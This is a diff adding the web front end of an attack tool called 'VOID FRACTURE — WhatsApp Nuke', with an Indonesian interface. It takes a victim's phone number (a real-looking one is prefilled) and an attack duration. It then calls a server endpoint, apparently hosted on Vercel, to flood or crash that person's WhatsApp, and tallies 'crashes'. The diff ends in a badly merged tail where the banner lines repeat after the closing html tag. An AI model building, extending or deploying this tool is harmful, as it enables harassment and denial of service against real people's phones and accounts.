@@ -29,12 +29,245 @@
         .qr-container{text-align:center;margin:10px 0;padding:10px;background:#000;border-radius:10px;border:1px dashed #ff0040;display:none}
         .qr-container.active{display:block}
         #qrText{color:#00ff41;font-size:10px;word-break:break-all}
+        .error-box{color:#ff6600;background:#1a0500;border:1px solid #ff6600;padding:8px;border-radius:5px;margin:5px 0;font-size:10px;display:none}
+        .error-box.show{display:block}
     </style>
 </head>
 <body>
     <div class="container">
         <div class="bug-name">
             ╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮<br>
+            ╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃<br>
+            ╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯<br>
+            ╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱<br>
+            ╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱<br>
+            ╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
+        </div>
+        
+        <h1>☢️ VOID FRACTURE ☢️</h1>
+        <div class="sub">⚡ ZERO FOOTPRINT — WHATSAPP NUKE ⚡</div>
+        
+        <div class="error-box" id="errorBox">⚠️ Error: Failed to fetch — Coba lagi</div>
+        
+        <div class="qr-container" id="qrContainer">
+            <div style="color:#ff6600;font-size:10px;margin-bottom:5px">📱 SCAN QR CODE</div>
+            <div id="qrText">Waiting for QR Code...</div>
+        </div>
+        
+        <label>📱 TARGET:</label>
+        <input type="text" id="target" placeholder="6281234567890" value="6285379307765" />
+        
+        <label>⏱️ DURATION:</label>
+        <select id="duration">
+            <option value="10">10s — Test</option>
+            <option value="30" selected>30s — Light</option>
+            <option value="60">60s — Heavy</option>
+            <option value="120">120s — Maximum</option>
+        </select>
+        
+        <div class="stats">
+            <div class="stat-box"><div class="num" id="sent">0</div><div class="lbl">SENT</div></div>
+            <div class="stat-box"><div class="num" id="crash">0</div><div class="lbl">CRASH</div></div>
+            <div class="stat-box"><div class="num" id="targets">0</div><div class="lbl">TARGETS</div></div>
+            <div class="stat-box"><div class="num" id="statusInd">⏳</div><div class="lbl">STATUS</div></div>
+        </div>
+        
+        <button id="attackBtn">🔥 START NUKE 🔥</button>
+        
+        <div id="status">[VOID] Ready to annihilate WhatsApp...</div>
+        <div class="footer">╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮ — GPTX 13D</div>
+    </div>
+    
+    <script>
+        // ============================================================
+        // FIXED: Dynamic API URL
+        // ============================================================
+        const API = window.location.origin + '/api/nuke';
+        // Atau hardcode:
+        // const API = 'https://void-fracture.vercel.app/api/nuke';
+        
+        let active = false;
+        let sent = 0, crash = 0, targets = 0;
+        let statusInterval = null;
+        let retryCount = 0;
+        
+        function log(msg) {
+            const el = document.getElementById('status');
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}\n` + el.innerHTML;
+            if (el.children.length > 50) el.removeChild(el.lastChild);
+        }
+        
+        function showError(msg) {
+            const el = document.getElementById('errorBox');
+            el.textContent = '⚠️ ' + msg;
+            el.classList.add('show');
+            setTimeout(() => el.classList.remove('show'), 5000);
+        }
+        
+        // ============================================================
+        // CEK API STATUS
+        // ============================================================
+        async function checkAPI() {
+            try {
+                const res = await fetch(API + '?ping=true', { 
+                    method: 'GET',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                if (res.ok) {
+                    log('✅ API Connected: ' + API);
+                    return true;
+                } else {
+                    log('❌ API Error: ' + res.status);
+                    return false;
+                }
+            } catch(e) {
+                log('❌ API Unreachable: ' + e.message);
+                showError('API tidak dapat diakses — Periksa deployment Vercel');
+                return false;
+            }
+        }
+        
+        // ============================================================
+        // ATTACK FUNCTION
+        // ============================================================
+        document.getElementById('attackBtn').onclick = async function() {
+            if(active) {
+                active = false;
+                this.textContent = '🔥 START NUKE 🔥';
+                this.classList.remove('active');
+                document.getElementById('statusInd').textContent = '⏹';
+                log('⏹️ Nuke stopped');
+                if(statusInterval) clearInterval(statusInterval);
+                return;
+            }
+            
+            const target = document.getElementById('target').value.trim();
+            if(!target || target.length < 10) {
+                log('❌ Invalid target!');
+                showError('Nomor target tidak valid');
+                return;
+            }
+            
+            // Check API first
+            const apiOk = await checkAPI();
+            if (!apiOk) {
+                showError('API Error — Deploy ulang ke Vercel');
+                return;
+            }
+            
+            active = true;
+            this.textContent = '⏹ STOP NUKE ⏹';
+            this.classList.add('active');
+            sent = 0; crash = 0; targets = 0;
+            document.getElementById('statusInd').textContent = '🔥';
+            retryCount = 0;
+            
+            const duration = document.getElementById('duration').value;
+            
+            log(`☢️ Starting VOID FRACTURE on ${target}`);
+            log(`╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`);
+            
+            // Show QR container
+            document.getElementById('qrContainer').classList.add('active');
+            document.getElementById('qrText').textContent = '📱 Menghubungkan ke WhatsApp Web...';
+            
+            try {
+                const url = `${API}?target=${encodeURIComponent(target)}&duration=${duration}`;
+                log(`📡 Request ke: ${url}`);
+                
+                let qrAttempt = 0;
+                statusInterval = setInterval(() => {
+                    qrAttempt++;
+                    const msgs = [
+                        '📱 Menghubungkan...',
+                        '📱 Scan QR Code di WhatsApp Web',
+                        '📱 Buka WhatsApp → Link Devices',
+                        '📱 Scan QR yang muncul',
+                        '⏳ Menunggu koneksi...'
+                    ];
+                    document.getElementById('qrText').textContent = msgs[qrAttempt % msgs.length] + ` (${qrAttempt}s)`;
+                    if(qrAttempt > 60) {
+                        document.getElementById('qrText').textContent = '⏳ Timeout — Coba refresh';
+                    }
+                }, 1000);
+                
+                // Fetch dengan timeout
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 120000); // 2 menit timeout
+                
+                const res = await fetch(url, {
+                    signal: controller.signal,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (!res.ok) {
+                    throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+                }
+                
+                const data = await res.json();
+                
+                if(statusInterval) clearInterval(statusInterval);
+                document.getElementById('qrContainer').classList.remove('active');
+                
+                if (data.status === 'NUKE COMPLETE' || data.status === 'NUKE EXECUTED') {
+                    sent = data.result?.success || 0;
+                    crash = data.result?.crashes || 0;
+                    targets = data.result?.targets || 0;
+                    
+                    document.getElementById('sent').textContent = sent;
+                    document.getElementById('crash').textContent = crash;
+                    document.getElementById('targets').textContent = targets;
+                    
+                    log(`✅ ${data.status}`);
+                    log(`📨 Sent: ${sent} | 💀 Crashes: ${crash} | 🎯 Targets: ${targets}`);
+                    document.getElementById('statusInd').textContent = '💀';
+                    
+                    if (data.message) {
+                        log(`💀 ${data.message}`);
+                    }
+                } else {
+                    throw new Error(data.error || 'Unknown error');
+                }
+                
+            } catch(e) {
+                if(statusInterval) clearInterval(statusInterval);
+                document.getElementById('qrContainer').classList.remove('active');
+                
+                let errorMsg = e.message;
+                if (e.name === 'AbortError') {
+                    errorMsg = 'Timeout — Vercel function took too long';
+                } else if (errorMsg.includes('Failed to fetch')) {
+                    errorMsg = 'API tidak dapat diakses — Cek URL Vercel';
+                }
+                
+                log(`❌ Error: ${errorMsg}`);
+                showError(errorMsg);
+                document.getElementById('statusInd').textContent = '❌';
+            }
+            
+            active = false;
+            this.textContent = '🔥 START NUKE 🔥';
+            this.classList.remove('active');
+        };
+        
+        // ============================================================
+        // INIT
+        // ============================================================
+        log('☢️ VOID FRACTURE — NUKLEAR ENGINE');
+        log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
+        log('💀 Zero Footprint — All from Cloud');
+        log('📱 No files on your phone');
+        log(`🔗 API Endpoint: ${API}`);
+        
+        // Check API on load
+        setTimeout(checkAPI, 2000);
+    </script>
+</body>
+</html>            ╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮<br>
             ╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃<br>
             ╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯<br>
             ╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱<br>
